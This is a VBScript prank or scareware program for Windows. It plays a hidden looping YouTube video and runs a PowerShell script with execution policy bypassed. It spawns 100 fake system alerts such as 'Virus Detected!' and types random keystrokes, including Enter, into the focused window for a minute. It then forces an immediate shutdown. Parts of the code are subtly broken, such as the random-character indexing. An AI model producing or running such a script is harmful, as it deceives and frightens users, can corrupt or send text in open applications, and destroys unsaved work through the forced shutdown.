Set WshShell = CreateObject("WScript.Shell")

' Open YouTube in a hidden browser with loop enabled
Set ie = CreateObject("InternetExplorer.Application")
ie.Visible = False
ie.Navigate "https://www.youtube.com/embed/uLghjAKpBMU?autoplay=1&loop=1&playlist=uLghjAKpBMU"

' Start glitch effect using PowerShell (instantly)
WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False

' Open 100 error pop-ups in random screen locations (1 per second)
For i = 1 To 100
    Randomize
    errorMessages = Array("System Malfunction!", "Critical Error!", "Memory Overload!", "Virus Detected!", "Fatal System Fault!", "Device Failure!", "Unknown Process Running!", "Unauthorized Access Detected!")
    randError = errorMessages(Int(Rnd * UBound(errorMessages)))

    iconTypes = Array(vbCritical, vbExclamation, vbQuestion, vbInformation)
    randIcon = iconTypes(Int(Rnd * 4))

    ' Generate random screen position
    xPos = Int(Rnd * 800) ' Adjust this based on screen size
    yPos = Int(Rnd * 600)

    ' Launch error box at random coordinates
    WshShell.Run "mshta vbscript:msgbox(""" & randError & """, " & randIcon & ", ""System Alert"")", 0, False
    WScript.Sleep 1000 ' Open one per second
Next

' Typing loop for 60 seconds
startTime = Timer
Do While Timer - startTime < 60
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
    output = ""

    ' Generate random text instantly
    For i = 1 To 20
        output = output & Mid(chars, Int((Len(chars) * Rnd) * Len(chars) + 1), 1)
    Next

    ' Randomly press Enter or Space
    specialKeys = Array("{ENTER}", " ")
    randKey = specialKeys(Int(Rnd * 2))
    WshShell.SendKeys output & randKey
    WScript.Sleep 300
Loop

' Shutdown after one minute
WshShell.Run "shutdown -s -t 0"
